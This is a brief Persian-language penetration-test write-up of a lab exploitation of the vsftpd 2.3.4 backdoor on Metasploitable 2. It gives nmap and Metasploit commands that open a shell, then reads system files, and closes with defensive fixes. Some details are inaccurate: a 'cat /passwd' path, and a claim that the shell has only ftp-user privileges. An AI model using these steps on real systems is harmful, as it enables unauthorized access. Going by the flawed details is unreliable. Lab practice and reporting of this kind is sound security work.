
---

## 📝 گزارش تست نفوذ – پورت 21 (FTP)

### 🎯 عنوان: Exploitation of vsftpd 2.3.4 Backdoor via Port 21

---

### 🧩 اطلاعات هدف:

* **سیستم هدف:** Metasploitable 2
* **آدرس IP:** `192.168.x.x`
* **پورت بررسی‌شده:** `21/tcp`
* **سرویس:** FTP
* **نسخه:** vsftpd 2.3.4

---

### 🔍 مراحل انجام تست:

#### 1. **اسکن اولیه با Nmap**

```bash
nmap -sV -p 21 192.168.x.x
```

📌 خروجی:

```
21/tcp open ftp vsftpd 2.3.4
```

---

#### 2. **اجرای Metasploit**

```bash
./msfconsole
```

#### 3. **جستجوی اکسپلویت**

```bash
search vsftpd
```

#### 4. **انتخاب ماژول مناسب**

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

#### 5. **تنظیم آدرس IP هدف**

```bash
set RHOSTS 192.168.x.x
```

#### 6. **اجرای اکسپلویت**

```bash
run
```

📌 نتیجه:

```
[*] Command shell session 1 opened (192.168.x.x:21)
```

---

### 💻 دستورات اجرا شده در شل بازشده:

```bash
whoami       --> ftp
uname -a     --> Linux metasploitable ...
ls -la       --> لیست فایل‌ها و مسیرها
cd /etc      --> تغییر مسیر برای بررسی تنظیمات سیستم
cat /passwd  --> بررسی کاربران سیستم
```

---

### 🧠 تحلیل آسیب‌پذیری:

* نسخه `vsftpd 2.3.4` دارای بک‌دور شناخته‌شده‌ای هست که با ارسال username خاص (`:)`) باعث باز شدن یک shell میشه.
* این اکسپلویت بدون نیاز به رمز عبور عمل می‌کنه.
* سطح دسترسی به صورت محدود (ftp user) ولی قابل ارتقا هست.

---

### 🔒 پیشنهاد امنیتی:

* به‌روزرسانی فوری به نسخه امن‌تر vsftpd (مثلاً 3.x)
* بستن پورت 21 روی فایروال اگر نیاز به FTP نیست
* استفاده از SFTP با احراز هویت قوی

---

